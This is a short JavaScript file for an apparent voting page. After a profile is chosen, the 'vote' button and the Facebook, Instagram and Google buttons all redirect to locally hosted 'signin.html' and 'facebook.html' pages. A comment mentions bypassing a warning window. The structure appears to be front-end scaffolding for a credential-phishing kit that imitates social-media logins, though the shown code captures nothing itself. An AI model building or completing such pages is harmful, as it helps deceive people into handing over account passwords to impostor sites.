// Function to redirect to the sign-in page
function redirectToSignIn(page) {
  window.location.href = page;
}

// Function to check if a profile is selected
function checkProfile() {
  var profile1 = document.getElementById("profile1");
  var profile2 = document.getElementById("profile2");

  if (!profile1.checked && !profile2.checked) {
    alert("Please choose a profile!");
    return false;
  }

  return true;
}

// Get the button elements
var voteBtn = document.getElementById('voteBtn');
var facebookBtn = document.getElementById('facebookBtn');
var instagramBtn = document.getElementById('instagramBtn');
var googleBtn = document.getElementById('googleBtn');

// Add click event listener to the vote button
voteBtn.addEventListener('click', function() {
  if (checkProfile()) {
    redirectToSignIn('signin.html');
  }
});

// Add click event listeners to the social media buttons
facebookBtn.addEventListener('click', function() {
  redirectToSignIn('signin.html');
});

instagramBtn.addEventListener('click', function() {
  redirectToSignIn('signin.html');
});

googleBtn.addEventListener('click', function() {
  redirectToSignIn('signin.html');
});

// Select the Facebook login button element
const facebookButton = document.querySelector('.facebook-button');

// Add a click event listener to the login button
facebookButton.addEventListener('click', function(event) {
  event.preventDefault(); // Prevent the default behavior of the button
  
  // Write your code here to handle the login process or bypass the warning window
  
  // For example, you can redirect the user to the local "facebook.html" file
  window.location.href = 'facebook.html'; // Replace with the correct path to your "facebook.html" file
});
